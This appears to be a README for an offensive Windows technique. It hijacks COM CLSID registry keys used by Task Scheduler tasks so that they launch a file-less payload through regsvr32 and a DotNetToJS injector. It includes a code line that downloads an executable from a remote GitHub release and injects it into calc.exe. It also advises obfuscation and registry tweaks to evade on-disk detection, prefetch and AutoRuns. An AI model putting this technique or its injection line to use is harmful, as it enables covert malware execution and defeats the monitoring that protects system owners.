**Task Scheduler COM Registry Execution Technique**

**Overview**
This technique uses the Windows COM to abuse the usage of existing Task Scheduler tasks.

**Basic Execution Flow** 
1. Task Scheduler calls a CLSID
2. Registry lookup occurs in HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{CLSID}
3. the LocalServer32 key's default value contains the executable path or commandline
4. Svchost.exe will invoke it as commandline ( it will not bypass prefetch, since task scheduler does not invoke it )

**Key Characteristics**
No .exe References, only the CSLID inside the task
Registry-Based Execution: Execution parameters are stored in COM registry hives
Indirect Invocation: Execution is abstracted through registry lookups
In-Memory Execution: Can be combined with .NET-to-JavaScript converters for file-less payloads

**Execution Flow**
LocalServer32 → regsvr32.exe payload.xml → Injector → Target process (nothing is happening on disk)

**DotNetToJS**
Ive put the already working and ready to use code and compiled binaries inside the release channel, ready to convert to a .js file.
Includes prefetch bypasses by manipulating the registry.

You will have to put this line of code after this one: var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
o.PerformInjection("https://github.com/b1scoito/clicker/releases/download/1.13/x64.exe", "C:\\Windows\\System32\\calc.exe");


**Obfuscation**
You can obfuscate a .js file using a lot of webistes including [CodeBeautifier.org](https://codebeautify.org/javascript-obfuscator)

This will get rid of all on disk detections.

**Note**
Ive added TLS 1.2 Support, meaning it can download off all websites.
You will have to delete the InProcServer32's default value path, otherwise it will skip the LocalServer32 one, this is gonna bypass AutoRuns.
Task has to be ran as Administrator.
